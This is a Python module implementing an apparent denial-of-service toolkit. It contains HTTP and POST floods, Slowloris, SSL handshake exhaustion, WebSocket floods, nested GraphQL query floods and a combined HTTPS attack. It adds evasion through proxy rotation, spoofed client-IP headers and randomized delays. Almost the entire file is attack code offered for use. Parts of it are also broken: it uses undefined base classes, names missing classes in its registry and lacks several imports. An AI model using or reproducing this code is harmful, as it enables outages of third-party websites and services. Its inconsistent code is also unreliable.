"""
Layer 7 Attack Implementations
Advanced HTTP/HTTPS attack methods with evasion techniques
"""

import asyncio
import aiohttp
import socket
import ssl
import time
import random
import threading
import warnings
import urllib3
from typing import Dict, List, Optional, Any, Callable
from dataclasses import dataclass
from urllib.parse import urlparse
import websockets

from core.base import BaseAttack, AttackResult, AttackStatus
from core.logger import logger
from core.utils import NetworkUtils, get_timestamp, sleep_random
from .proxy_manager import ProxyManager, ProxyInfo
from .request_builder import RequestBuilder, RequestConfig, HeaderGenerator, PayloadGenerator


@dataclass
class Layer7Config:
    """Configuration for Layer 7 attacks"""
    target_url: str
    threads: int = 200  # Increased from default
    duration: int = 300  # Increased duration
    requests_per_second: int = 500  # Increased from default
    payload_size: int = 16384  # Added large payload size (16KB)
    max_payload_size: int = 65536  # Maximum payload size (64KB)
    
    # Proxy settings
    use_proxies: bool = True
    proxy_timeout: int = 10
    max_proxy_failures: int = 3
    
    # Request settings
    user_agents_rotation: bool = True
    header_randomization: bool = True
    payload_randomization: bool = True
    
    # Evasion settings
    random_delays: bool = True
    connection_reuse: bool = False
    follow_redirects: bool = False
    verify_ssl: bool = False
    
    # Attack-specific settings
    custom_headers: Dict[str, str] = None
    custom_payload: str = None
    attack_path: str = "/"
    custom_payloads: List[str] = None  # Custom large payloads
    enable_post_flood: bool = True  # Enable POST flood with large data
    enable_slowloris: bool = True  # Enable slowloris attack
    slowloris_connections: int = 1000  # Increased connections
    enable_rudy: bool = True  # Enable R.U.D.Y attack
    rudy_post_size: int = 32768  # Large POST data size


class HTTPFloodAttack(BaseAttack):
    """High-volume HTTP GET/POST flood attack"""
    
    def __init__(self, config: Layer7Config):
        super().__init__(target=config.target_url)
        self.config = config
        self.proxy_manager = ProxyManager()
        self.request_builder = RequestBuilder()
        self.header_generator = HeaderGenerator()
        self.payload_generator = PayloadGenerator()
        
        self.stats = {
            'requests_sent': 0,
            'requests_successful': 0,
            'requests_failed': 0,
            'bytes_sent': 0,
            'avg_response_time': 0,
            'active_threads': 0
        }
        
        self.active_sessions = []
        self.stop_event = threading.Event()
    
    async def prepare(self) -> bool:
        """Prepare attack resources"""
        try:
            logger.info("Preparing HTTP Flood attack...")
            
            # Validate target
            parsed_url = urlparse(self.config.target_url)
            if not parsed_url.scheme or not parsed_url.netloc:
                logger.error("Invalid target URL")
                return False
            
            # Load proxies if enabled
            if self.config.use_proxies:
                logger.info("Loading proxy list...")
                await self.proxy_manager.load_proxies_from_sources()
                
                if not self.proxy_manager.get_working_proxies():
                    logger.warning("No working proxies found, continuing without proxies")
                    self.config.use_proxies = False
            
            # Test target connectivity
            if not await self._test_target_connectivity():
                logger.error("Target is not reachable")
                return False
            
            logger.success("HTTP Flood attack prepared successfully")
            return True
            
        except Exception as e:
            logger.error(f"Failed to prepare attack: {e}")
            return False
    
    async def execute(self) -> AttackResult:
        """Execute HTTP flood attack"""
        try:
            logger.info(f"Starting HTTP Flood attack on {self.config.target_url}")
            logger.info(f"Threads: {self.config.threads}, Duration: {self.config.duration}s")
            
            self.status = AttackStatus.RUNNING
            start_time = time.time()
            
            # Create attack tasks
            tasks = []
            for i in range(self.config.threads):
                task = asyncio.create_task(self._attack_worker(i))
                tasks.append(task)
            
            # Monitor attack duration
            monitor_task = asyncio.create_task(self._monitor_attack())
            tasks.append(monitor_task)
            
            # Wait for completion
            await asyncio.gather(*tasks, return_exceptions=True)
            
            end_time = time.time()
            duration = end_time - start_time
            
            # Calculate final statistics
            success_rate = (self.stats['requests_successful'] / max(self.stats['requests_sent'], 1)) * 100
            rps = self.stats['requests_sent'] / max(duration, 1)
            
            result = AttackResult(
                success=True,
                duration=duration,
                requests_sent=self.stats['requests_sent'],
                requests_successful=self.stats['requests_successful'],
                bytes_sent=self.stats['bytes_sent'],
                success_rate=success_rate,
                requests_per_second=rps,
                additional_data={
                    'failed_requests': self.stats['requests_failed'],
                    'avg_response_time': self.stats['avg_response_time'],
                    'max_threads': self.config.threads
                }
            )
            
            logger.success(f"HTTP Flood completed: {self.stats['requests_sent']} requests, {success_rate:.1f}% success rate")
            return result
            
        except Exception as e:
            logger.error(f"Attack execution failed: {e}")
            return AttackResult(success=False, error=str(e))
    
    async def cleanup(self):
        """Clean up attack resources"""
        try:
            logger.info("Cleaning up HTTP Flood attack...")
            
            # Stop all workers
            self.stop_event.set()
            
            # Close active sessions
            for session in self.active_sessions:
                if not session.closed:
                    await session.close()
            
            self.active_sessions.clear()
            self.status = AttackStatus.COMPLETED
            
            logger.info("HTTP Flood cleanup completed")
            
        except Exception as e:
            logger.error(f"Cleanup failed: {e}")
    
    async def _attack_worker(self, worker_id: int):
        """Individual attack worker thread"""
        try:
            # Create HTTP session
            timeout = aiohttp.ClientTimeout(total=self.config.proxy_timeout)
            connector = aiohttp.TCPConnector(
                limit=100,
                limit_per_host=10,
                ttl_dns_cache=300,
                use_dns_cache=True,
                ssl=False if not self.config.verify_ssl else None
            )
            
            session = aiohttp.ClientSession(
                timeout=timeout,
                connector=connector,
                headers=self.header_generator.generate_basic_headers(urlparse(self.config.target_url).netloc)
            )
            
            self.active_sessions.append(session)
            self.stats['active_threads'] += 1
            
            request_count = 0
            last_request_time = 0
            
            while not self.stop_event.is_set():
                try:
                    # Rate limiting
                    current_time = time.time()
                    if self.config.requests_per_second > 0:
                        time_since_last = current_time - last_request_time
                        min_interval = 1.0 / self.config.requests_per_second
                        
                        if time_since_last < min_interval:
                            await asyncio.sleep(min_interval - time_since_last)
                    
                    # Get proxy if enabled
                    proxy = None
                    if self.config.use_proxies:
                        proxy_info = self.proxy_manager.get_random_proxy()
                        if proxy_info:
                            proxy = f"http://{proxy_info.host}:{proxy_info.port}"
                    
                    # Build request with large payload
                    headers = self._generate_request_headers()
                    
                    # Generate large payload for maximum bandwidth consumption
                    payload_data = None
                    if self.config.enable_post_flood:
                        payload_size = random.randint(self.config.payload_size, self.config.max_payload_size)
                        payload_data = self._generate_large_payload(payload_size)
                    
                    # Send multiple requests with different methods for maximum impact
                    methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS']
                    method = random.choice(methods)
                    
                    # Send request
                    start_req_time = time.time()
                    
                    if method == 'POST' and payload_data:
                        async with session.post(
                            self.config.target_url + self.config.attack_path,
                            headers=headers,
                            data=payload_data,
                            proxy=proxy,
                            allow_redirects=self.config.follow_redirects
                        ) as response:
                            await response.read()  # Consume response
                    else:
                        async with session.request(
                            method,
                            self.config.target_url + self.config.attack_path,
                            headers=headers,
                            proxy=proxy,
                            allow_redirects=self.config.follow_redirects
                        ) as response:
                            await response.read()  # Consume response
                        
                        end_req_time = time.time()
                        response_time = end_req_time - start_req_time
                        
                        # Update statistics
                        self.stats['requests_sent'] += 1
                        if response.status < 400:
                            self.stats['requests_successful'] += 1
                        else:
                            self.stats['requests_failed'] += 1
                        
                        self.stats['bytes_sent'] += len(str(headers))
                        
                        # Update average response time
                        if self.stats['avg_response_time'] == 0:
                            self.stats['avg_response_time'] = response_time
                        else:
                            self.stats['avg_response_time'] = (
                                self.stats['avg_response_time'] * 0.9 + response_time * 0.1
                            )
                    
                    request_count += 1
                    last_request_time = time.time()
                    
                    # Random delay for evasion
                    if self.config.random_delays:
                        await sleep_random(0.01, 0.1)
                
                except asyncio.CancelledError:
                    break
                except Exception as e:
                    self.stats['requests_failed'] += 1
                    if "proxy" in str(e).lower() and proxy:
                        # Mark proxy as failed
                        proxy_host, proxy_port = proxy.replace("http://", "").split(":")
                        self.proxy_manager.mark_proxy_failed(proxy_host, int(proxy_port))
                    
                    await asyncio.sleep(0.1)  # Brief pause on error
            
            await session.close()
            self.stats['active_threads'] -= 1
            
        except Exception as e:
            logger.error(f"Worker {worker_id} failed: {e}")
            self.stats['active_threads'] -= 1
    
    async def _monitor_attack(self):
        """Monitor attack progress and duration"""
        start_time = time.time()
        
        while not self.stop_event.is_set():
            elapsed = time.time() - start_time
            
            if elapsed >= self.config.duration:
                logger.info("Attack duration reached, stopping...")
                self.stop_event.set()
                break
            
            # Log progress every 10 seconds
            if int(elapsed) % 10 == 0 and elapsed > 0:
                rps = self.stats['requests_sent'] / elapsed
                logger.info(f"Progress: {int(elapsed)}s, {self.stats['requests_sent']} requests, {rps:.1f} RPS")
            
            await asyncio.sleep(1)
    
    def _generate_request_headers(self) -> Dict[str, str]:
        """Generate randomized request headers with large content"""
        if self.config.header_randomization:
            headers = self.header_generator.generate_evasive_headers(
                urlparse(self.config.target_url).netloc
            )
        else:
            headers = self.header_generator.generate_basic_headers(
                urlparse(self.config.target_url).netloc
            )
        
        # Add custom headers for maximum impact
        headers.update({
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9,tr;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'DNT': '1',
            'Origin': self.config.target_url,
            'Pragma': 'no-cache',
            'Referer': self.config.target_url,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Upgrade-Insecure-Requests': '1',
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Originating-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Remote-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Remote-Addr': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        })
        
        # Add custom headers
        if self.config.custom_headers:
            headers.update(self.config.custom_headers)
        
        return headers
    
    def _generate_large_payload(self, size: int) -> str:
        """Generate large payload data for bandwidth consumption"""
        # Create random data with various patterns
        patterns = [
            'A' * (size // 4),
            '0' * (size // 4), 
            'X' * (size // 4),
            ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=size // 4))
        ]
        
        # Combine patterns for maximum payload size
        payload = ''.join(patterns)
        
        # Add form data structure for POST requests
        form_data = f"data={payload}&submit=1&action=attack&size={size}&timestamp={int(time.time())}"
        
        return form_data
    
    async def _test_target_connectivity(self) -> bool:
        """Test if target is reachable"""
        try:
            parsed_url = urlparse(self.config.target_url)
            host = parsed_url.netloc.split(':')[0]
            port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
            
            # Test TCP connectivity
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, port))
            sock.close()
            
            return result == 0
            
        except Exception:
            return False


class SlowlorisAttack(Layer7Attack):
    """Slowloris attack - keeps connections open by sending partial HTTP requests"""
    
    def __init__(self, config: Layer7Config):
        super().__init__(config)
        self.attack_name = "Slowloris"
        self.connections = []
        self.headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept-Language: en-US,en;q=0.9",
            "Accept-Encoding: gzip, deflate",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Connection: keep-alive",
            "Cache-Control: no-cache"
        ]

    def prepare_attack(self) -> bool:
        """Prepare Slowloris attack"""
        if not self._validate_target():
            return False
        
        logger.info("Preparing Slowloris attack")
        return True

    def execute_attack(self) -> Dict[str, Any]:
        """Execute Slowloris attack"""
        # Create initial connections
        self._create_connections()
        
        start_time = time.time()
        while (time.time() - start_time) < self.config.attack_duration and self.is_running:
            # Send keep-alive headers to maintain connections
            self._send_keep_alive_headers()
            
            # Create new connections if some were closed
            if len(self.connections) < self.config.threads:
                self._create_connections()
            
            time.sleep(10)  # Wait 10 seconds between keep-alive sends
        
        self._close_connections()
        
        return {
            'success': True,
            'attack_type': 'Slowloris',
            'connections_created': self.stats['requests_sent'],
            'bytes_sent': self.stats['bytes_sent']
        }

    def _create_connections(self):
        """Create partial HTTP connections"""
        target_connections = self.config.threads
        
        while len(self.connections) < target_connections and self.is_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                
                if self.config.use_ssl:
                    import ssl
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.config.target_host)
                
                sock.connect((self.config.target_host, self.config.target_port))
                
                # Send partial HTTP request
                request = f"GET {self.config.target_path} HTTP/1.1\r\n"
                request += f"Host: {self.config.target_host}\r\n"
                
                # Send some headers but not all
                for header in self.headers[:3]:
                    request += f"{header}\r\n"
                
                sock.send(request.encode())
                self.connections.append(sock)
                self.stats['requests_sent'] += 1
                self.stats['bytes_sent'] += len(request)
                
            except Exception as e:
                logger.debug(f"Failed to create connection: {e}")
                continue

    def _send_keep_alive_headers(self):
        """Send additional headers to keep connections alive"""
        active_connections = []
        
        for sock in self.connections:
            try:
                # Send a random header to keep connection alive
                header = f"X-Random-{random.randint(1000, 9999)}: {random.randint(1, 100)}\r\n"
                sock.send(header.encode())
                self.stats['bytes_sent'] += len(header)
                active_connections.append(sock)
                
            except Exception as e:
                logger.debug(f"Connection lost: {e}")
                try:
                    sock.close()
                except:
                    pass
        
        self.connections = active_connections

    def _close_connections(self):
        """Close all connections"""
        for sock in self.connections:
            try:
                sock.close()
            except:
                pass
        self.connections.clear()

    def cleanup(self):
        """Cleanup Slowloris resources"""
        self._close_connections()


class HTTPPOSTFloodAttack(Layer7Attack):
    """HTTP POST flood attack with large payloads"""
    
    def __init__(self, config: Layer7Config):
        super().__init__(config)
        self.attack_name = "HTTP POST Flood"
        self.payload_sizes = [1024, 2048, 4096, 8192, 16384]

    def prepare_attack(self) -> bool:
        """Prepare HTTP POST flood attack"""
        if not self._validate_target():
            return False
        
        logger.info("Preparing HTTP POST flood attack")
        return True

    def execute_attack(self) -> Dict[str, Any]:
        """Execute HTTP POST flood attack"""
        requests_per_thread = self.config.requests_per_second // self.config.threads
        
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = []
            
            for thread_id in range(self.config.threads):
                future = executor.submit(
                    self._post_flood_worker,
                    thread_id, requests_per_thread
                )
                futures.append(future)
            
            start_time = time.time()
            while (time.time() - start_time) < self.config.attack_duration and self.is_running:
                time.sleep(0.1)
            
            self.is_running = False
            
            for future in as_completed(futures, timeout=5):
                try:
                    future.result()
                except Exception as e:
                    logger.debug(f"Thread error: {e}")
        
        return {
            'success': True,
            'attack_type': 'HTTP POST Flood',
            'requests_sent': self.stats['requests_sent'],
            'bytes_sent': self.stats['bytes_sent']
        }

    def _post_flood_worker(self, thread_id: int, requests_per_second: int):
        """Worker thread for HTTP POST flood"""
        request_interval = 1.0 / requests_per_second if requests_per_second > 0 else 0
        last_request_time = time.time()
        
        while self.is_running:
            current_time = time.time()
            
            if current_time - last_request_time >= request_interval:
                try:
                    # Create large POST payload
                    payload_size = random.choice(self.payload_sizes)
                    payload_data = 'A' * payload_size
                    
                    # Create POST request
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Content-Length': str(len(payload_data)),
                        'Connection': 'close'
                    }
                    
                    if self.config.use_proxy and self.proxy_manager:
                        proxy = self.proxy_manager.get_proxy()
                        if proxy:
                            headers['Proxy-Connection'] = 'keep-alive'
                    
                    # Send POST request
                    with warnings.catch_warnings():
                        warnings.simplefilter('ignore', urllib3.exceptions.InsecureRequestWarning)
                        response = self.session.post(
                            f"{'https' if self.config.use_ssl else 'http'}://{self.config.target_host}:{self.config.target_port}{self.config.target_path}",
                            data=payload_data,
                            headers=headers,
                            timeout=10,
                            verify=False
                        )
                    
                    self.stats['requests_sent'] += 1
                    self.stats['bytes_sent'] += len(payload_data)
                    
                    if response.status_code:
                        self.stats['responses_received'] += 1
                
                except Exception as e:
                    self.stats['errors'] += 1
                    logger.debug(f"POST flood error: {e}")
                
                last_request_time = current_time
            
            time.sleep(0.001)


class SSLExhaustionAttack(Layer7Attack):
    """SSL/TLS exhaustion attack - forces expensive SSL handshakes"""
    
    def __init__(self, config: Layer7Config):
        super().__init__(config)
        self.attack_name = "SSL Exhaustion"

    def prepare_attack(self) -> bool:
        """Prepare SSL exhaustion attack"""
        if not self._validate_target():
            return False
        
        if not self.config.use_ssl:
            logger.error("SSL exhaustion attack requires SSL/TLS target")
            return False
        
        logger.info("Preparing SSL exhaustion attack")
        return True

    def execute_attack(self) -> Dict[str, Any]:
        """Execute SSL exhaustion attack"""
        connections_per_thread = self.config.requests_per_second // self.config.threads
        
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = []
            
            for thread_id in range(self.config.threads):
                future = executor.submit(
                    self._ssl_exhaustion_worker,
                    thread_id, connections_per_thread
                )
                futures.append(future)
            
            start_time = time.time()
            while (time.time() - start_time) < self.config.attack_duration and self.is_running:
                time.sleep(0.1)
            
            self.is_running = False
            
            for future in as_completed(futures, timeout=5):
                try:
                    future.result()
                except Exception as e:
                    logger.debug(f"Thread error: {e}")
        
        return {
            'success': True,
            'attack_type': 'SSL Exhaustion',
            'ssl_handshakes': self.stats['requests_sent'],
            'bytes_sent': self.stats['bytes_sent']
        }

    def _ssl_exhaustion_worker(self, thread_id: int, connections_per_second: int):
        """Worker thread for SSL exhaustion"""
        connection_interval = 1.0 / connections_per_second if connections_per_second > 0 else 0
        last_connection_time = time.time()
        
        while self.is_running:
            current_time = time.time()
            
            if current_time - last_connection_time >= connection_interval:
                try:
                    # Create SSL connection and immediately close it
                    import ssl
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    
                    # Create SSL context with various cipher suites
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    # Force expensive cipher suites
                    context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
                    
                    # Wrap socket with SSL
                    ssl_sock = context.wrap_socket(sock, server_hostname=self.config.target_host)
                    
                    # Connect and perform handshake
                    ssl_sock.connect((self.config.target_host, self.config.target_port))
                    
                    # Send minimal HTTP request
                    request = f"GET {self.config.target_path} HTTP/1.1\r\nHost: {self.config.target_host}\r\n\r\n"
                    ssl_sock.send(request.encode())
                    
                    self.stats['requests_sent'] += 1
                    self.stats['bytes_sent'] += len(request)
                    
                    # Immediately close to force new handshake next time
                    ssl_sock.close()
                
                except Exception as e:
                    self.stats['errors'] += 1
                    logger.debug(f"SSL exhaustion error: {e}")
                
                last_connection_time = current_time
            
            time.sleep(0.001)


class WebSocketFloodAttack(Layer7Attack):
    """WebSocket flood attack"""
    
    def __init__(self, config: Layer7Config):
        super().__init__(config)
        self.attack_name = "WebSocket Flood"
        self.websocket_connections = []

    def prepare_attack(self) -> bool:
        """Prepare WebSocket flood attack"""
        if not self._validate_target():
            return False
        
        logger.info("Preparing WebSocket flood attack")
        return True

    def execute_attack(self) -> Dict[str, Any]:
        """Execute WebSocket flood attack"""
        # Create WebSocket connections
        self._create_websocket_connections()
        
        # Start message flooding
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = []
            
            for thread_id in range(self.config.threads):
                future = executor.submit(self._websocket_flood_worker, thread_id)
                futures.append(future)
            
            start_time = time.time()
            while (time.time() - start_time) < self.config.attack_duration and self.is_running:
                time.sleep(0.1)
            
            self.is_running = False
            
            for future in as_completed(futures, timeout=5):
                try:
                    future.result()
                except Exception as e:
                    logger.debug(f"Thread error: {e}")
        
        self._close_websocket_connections()
        
        return {
            'success': True,
            'attack_type': 'WebSocket Flood',
            'messages_sent': self.stats['requests_sent'],
            'bytes_sent': self.stats['bytes_sent']
        }

    def _create_websocket_connections(self):
        """Create WebSocket connections"""
        import base64
        import hashlib
        
        for i in range(min(self.config.threads, 100)):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                
                if self.config.use_ssl:
                    import ssl
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.config.target_host)
                
                sock.connect((self.config.target_host, self.config.target_port))
                
                # WebSocket handshake
                key = base64.b64encode(os.urandom(16)).decode()
                
                handshake = f"GET {self.config.target_path} HTTP/1.1\r\n"
                handshake += f"Host: {self.config.target_host}:{self.config.target_port}\r\n"
                handshake += "Upgrade: websocket\r\n"
                handshake += "Connection: Upgrade\r\n"
                handshake += f"Sec-WebSocket-Key: {key}\r\n"
                handshake += "Sec-WebSocket-Version: 13\r\n"
                handshake += "\r\n"
                
                sock.send(handshake.encode())
                
                # Read handshake response
                response = sock.recv(1024).decode()
                
                if "101 Switching Protocols" in response:
                    self.websocket_connections.append(sock)
                else:
                    sock.close()
                
            except Exception as e:
                logger.debug(f"Failed to create WebSocket connection: {e}")

    def _websocket_flood_worker(self, thread_id: int):
        """Worker thread for WebSocket message flooding"""
        if not self.websocket_connections:
            return
        
        sock = self.websocket_connections[thread_id % len(self.websocket_connections)]
        
        while self.is_running:
            try:
                # Create WebSocket frame
                payload = os.urandom(random.randint(100, 1000))
                frame = self._create_websocket_frame(payload)
                
                sock.send(frame)
                self.stats['requests_sent'] += 1
                self.stats['bytes_sent'] += len(frame)
                
                time.sleep(0.01)  # Small delay between messages
                
            except Exception as e:
                logger.debug(f"WebSocket flood error: {e}")
                break

    def _create_websocket_frame(self, payload: bytes) -> bytes:
        """Create WebSocket frame"""
        # WebSocket frame format: FIN(1) + RSV(3) + Opcode(4) + MASK(1) + Payload length(7/16/64) + Masking key(32) + Payload
        
        frame = bytearray()
        
        # FIN = 1, Opcode = 2 (binary frame)
        frame.append(0x82)
        
        payload_length = len(payload)
        
        if payload_length < 126:
            # Mask bit = 1, payload length
            frame.append(0x80 | payload_length)
        elif payload_length < 65536:
            frame.append(0x80 | 126)
            frame.extend(struct.pack('>H', payload_length))
        else:
            frame.append(0x80 | 127)
            frame.extend(struct.pack('>Q', payload_length))
        
        # Masking key
        mask = os.urandom(4)
        frame.extend(mask)
        
        # Masked payload
        for i in range(len(payload)):
            frame.append(payload[i] ^ mask[i % 4])
        
        return bytes(frame)

    def _close_websocket_connections(self):
        """Close all WebSocket connections"""
        for sock in self.websocket_connections:
            try:
                sock.close()
            except:
                pass
        self.websocket_connections.clear()

    def cleanup(self):
        """Cleanup WebSocket resources"""
        self._close_websocket_connections()


class GraphQLFloodAttack(Layer7Attack):
    """GraphQL flood attack with complex queries"""
    
    def __init__(self, config: Layer7Config):
        super().__init__(config)
        self.attack_name = "GraphQL Flood"
        self.complex_queries = [
            """
            query ComplexQuery {
                users {
                    id
                    name
                    posts {
                        id
                        title
                        comments {
                            id
                            content
                            author {
                                id
                                name
                                posts {
                                    id
                                    title
                                }
                            }
                        }
                    }
                }
            }
            """,
            """
            query DeepNesting {
                user(id: "1") {
                    friends {
                        friends {
                            friends {
                                friends {
                                    friends {
                                        id
                                        name
                                    }
                                }
                            }
                        }
                    }
                }
            }
            """,
            """
            query ExpensiveAggregation {
                posts {
                    id
                    title
                    comments {
                        id
                        content
                    }
                    likes {
                        id
                        user {
                            id
                            name
                        }
                    }
                }
            }
            """
        ]

    def prepare_attack(self) -> bool:
        """Prepare GraphQL flood attack"""
        if not self._validate_target():
            return False
        
        logger.info("Preparing GraphQL flood attack")
        return True

    def execute_attack(self) -> Dict[str, Any]:
        """Execute GraphQL flood attack"""
        requests_per_thread = self.config.requests_per_second // self.config.threads
        
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = []
            
            for thread_id in range(self.config.threads):
                future = executor.submit(
                    self._graphql_flood_worker,
                    thread_id, requests_per_thread
                )
                futures.append(future)
            
            start_time = time.time()
            while (time.time() - start_time) < self.config.attack_duration and self.is_running:
                time.sleep(0.1)
            
            self.is_running = False
            
            for future in as_completed(futures, timeout=5):
                try:
                    future.result()
                except Exception as e:
                    logger.debug(f"Thread error: {e}")
        
        return {
            'success': True,
            'attack_type': 'GraphQL Flood',
            'queries_sent': self.stats['requests_sent'],
            'bytes_sent': self.stats['bytes_sent']
        }

    def _graphql_flood_worker(self, thread_id: int, requests_per_second: int):
        """Worker thread for GraphQL flood"""
        request_interval = 1.0 / requests_per_second if requests_per_second > 0 else 0
        last_request_time = time.time()
        
        while self.is_running:
            current_time = time.time()
            
            if current_time - last_request_time >= request_interval:
                try:
                    # Select random complex query
                    query = random.choice(self.complex_queries)
                    
                    # Create GraphQL request payload
                    payload = {
                        'query': query,
                        'variables': {},
                        'operationName': None
                    }
                    
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Content-Type': 'application/json',
                        'Accept': 'application/json',
                        'Connection': 'close'
                    }
                    
                    # Send GraphQL request
                    with warnings.catch_warnings():
                        warnings.simplefilter('ignore', urllib3.exceptions.InsecureRequestWarning)
                        response = self.session.post(
                            f"{'https' if self.config.use_ssl else 'http'}://{self.config.target_host}:{self.config.target_port}{self.config.target_path}",
                            json=payload,
                            headers=headers,
                            timeout=10,
                            verify=False
                        )
                    
                    self.stats['requests_sent'] += 1
                    self.stats['bytes_sent'] += len(str(payload))
                    
                    if response.status_code:
                        self.stats['responses_received'] += 1
                
                except Exception as e:
                    self.stats['errors'] += 1
                    logger.debug(f"GraphQL flood error: {e}")
                
                last_request_time = current_time
            
            time.sleep(0.001)


class HTTPSMixedAttack(Layer7Attack):
    """Mixed HTTPS attack combining multiple Layer 7 techniques"""
    
    def __init__(self, config: Layer7Config):
        super().__init__(config)
        self.attack_name = "HTTPS Mixed Attack"
        
        # Initialize sub-attacks
        self.slowloris = SlowlorisAttack(config)
        self.post_flood = HTTPPOSTFloodAttack(config)
        self.ssl_exhaustion = SSLExhaustionAttack(config)

    def prepare_attack(self) -> bool:
        """Prepare mixed HTTPS attack"""
        if not self._validate_target():
            return False
        
        logger.info("Preparing mixed HTTPS attack")
        return True

    def execute_attack(self) -> Dict[str, Any]:
        """Execute mixed HTTPS attack"""
        # Distribute threads among attack types
        threads_per_attack = self.config.threads // 3
        
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = []
            
            # Slowloris attack
            slowloris_config = Layer7Config(**self.config.__dict__)
            slowloris_config.threads = threads_per_attack
            self.slowloris.config = slowloris_config
            futures.append(executor.submit(self.slowloris.execute_attack))
            
            # POST flood attack
            post_config = Layer7Config(**self.config.__dict__)
            post_config.threads = threads_per_attack
            self.post_flood.config = post_config
            futures.append(executor.submit(self.post_flood.execute_attack))
            
            # SSL exhaustion attack
            if self.config.use_ssl:
                ssl_config = Layer7Config(**self.config.__dict__)
                ssl_config.threads = threads_per_attack
                self.ssl_exhaustion.config = ssl_config
                futures.append(executor.submit(self.ssl_exhaustion.execute_attack))
            
            # Wait for completion
            results = []
            for future in as_completed(futures):
                try:
                    result = future.result()
                    results.append(result)
                except Exception as e:
                    logger.debug(f"Sub-attack error: {e}")
        
        # Combine statistics
        total_requests = sum(r.get('requests_sent', 0) for r in results)
        total_bytes = sum(r.get('bytes_sent', 0) for r in results)
        
        return {
            'success': True,
            'attack_type': 'HTTPS Mixed Attack',
            'total_requests': total_requests,
            'bytes_sent': total_bytes,
            'sub_attack_results': results
        }

    def cleanup(self):
        """Cleanup mixed attack resources"""
        self.slowloris.cleanup()
        self.post_flood.cleanup()
        self.ssl_exhaustion.cleanup()


# Update attack registry
LAYER7_ATTACKS = {
    'http_flood': HTTPFloodAttack,
    'https_flood': HTTPSFloodAttack,
    'slowloris': SlowlorisAttack,
    'http_post_flood': HTTPPostFloodAttack,
    'ssl_exhaustion': SSLExhaustionAttack,
    'websocket_flood': WebSocketFloodAttack,
    'graphql_flood': GraphQLFloodAttack,
    'https_mixed': HTTPSMixedAttack,
}


def get_attack_class(attack_name: str) -> Optional[type]:
    """Get attack class by name"""
    return LAYER7_ATTACKS.get(attack_name.lower())


def list_available_attacks() -> List[str]:
    """List all available Layer 7 attacks"""
    return list(LAYER7_ATTACKS.keys())